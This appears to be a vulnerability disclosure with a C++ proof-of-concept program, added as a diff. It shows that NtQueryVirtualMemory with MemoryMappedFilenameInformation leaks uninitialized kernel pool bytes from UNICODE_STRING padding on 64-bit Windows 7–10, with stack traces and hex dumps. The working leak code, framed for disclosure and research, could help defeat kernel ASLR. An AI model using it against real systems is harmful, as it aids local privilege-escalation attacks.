@@ -1,0 +1,109 @@
+/*
+We have discovered that the nt!NtQueryVirtualMemory system call invoked with the 2 information class (MemoryMappedFilenameInformation) discloses portions of uninitialized kernel pool memory to user-mode clients. The vulnerability affects 64-bit versions of Windows 7 to 10.
+
+The output buffer for this information class is a UNICODE_STRING structure followed by the actual filename string. The output data is copied back to user-mode memory under the following stack trace (on Windows 7 64-bit):
+
+--- cut ---
+  kd> k
+   # Child-SP          RetAddr           Call Site
+  00 fffff880`03cfd8c8 fffff800`02970229 nt!memcpy+0x3
+  01 fffff880`03cfd8d0 fffff800`02970752 nt!IopQueryNameInternal+0x289
+  02 fffff880`03cfd970 fffff800`02967bb4 nt!IopQueryName+0x26
+  03 fffff880`03cfd9c0 fffff800`0296a80d nt!ObpQueryNameString+0xb0
+  04 fffff880`03cfdac0 fffff800`0268d093 nt!NtQueryVirtualMemory+0x5fb
+  05 fffff880`03cfdbb0 00000000`772abf6a nt!KiSystemServiceCopyEnd+0x13
+--- cut ---
+
+The UNICODE_STRING structure is defined as follows:
+
+--- cut ---
+  typedef struct _LSA_UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+  } LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;
+--- cut ---
+
+On 64-bit builds, there is a 4-byte padding between the "MaximumLength" and "Buffer" fields inserted by the compiler, in order to align the "Buffer" pointer to 8 bytes. This padding is left uninitialized in the code and is copied in this form to user-mode clients, passing over left-over data from the kernel pool.
+
+The issue can be reproduced by running the attached proof-of-concept program on a 64-bit system with the Special Pools mechanism enabled for ntoskrnl.exe. Then, it is clearly visible that bytes at offsets 4-7 are equal to the markers inserted by Special Pools, and would otherwise contain junk data that was previously stored in that memory region:
+
+--- cut ---
+  00000000: 6c 00 6e 00[37 37 37 37]f0 f6 af 87 dd 00 00 00 l.n.7777........
+--- cut ---
+  00000000: 6c 00 6e 00[59 59 59 59]e0 f6 b3 0f c8 00 00 00 l.n.YYYY........
+--- cut ---
+  00000000: 6c 00 6e 00[7b 7b 7b 7b]40 f1 af 16 18 00 00 00 l.n.{{{{@.......
+--- cut ---
+  00000000: 6c 00 6e 00[a3 a3 a3 a3]80 f0 90 aa 33 00 00 00 l.n.........3...
+--- cut --
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <cstdio>
+
+typedef enum _MEMORY_INFORMATION_CLASS {
+  MemoryMappedFilenameInformation = 2
+} MEMORY_INFORMATION_CLASS;
+
+extern "C"
+NTSTATUS NTAPI NtQueryVirtualMemory(
+  _In_      HANDLE                   ProcessHandle,
+  _In_opt_  PVOID                    BaseAddress,
+  _In_      MEMORY_INFORMATION_CLASS MemoryInformationClass,
+  _Out_     PVOID                    MemoryInformation,
+  _In_      SIZE_T                   MemoryInformationLength,
+  _Out_opt_ PSIZE_T                  ReturnLength
+);
+
+VOID PrintHex(PVOID Buffer, ULONG dwBytes) {
+  PBYTE Data = (PBYTE)Buffer;
+
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+int main() {
+  SIZE_T ReturnLength;
+  BYTE OutputBuffer[1024];
+
+  NTSTATUS st = NtQueryVirtualMemory(GetCurrentProcess(),
+                                     &main,
+                                     MemoryMappedFilenameInformation,
+                                     OutputBuffer,
+                                     sizeof(OutputBuffer),
+                                     &ReturnLength);
+
+  if (!NT_SUCCESS(st)) {
+    printf("NtQueryVirtualMemory failed, %x\n", st);
+    ExitProcess(1);
+  }
+
+  PrintHex(OutputBuffer, sizeof(UNICODE_STRING));
+
+  return 0;
+}
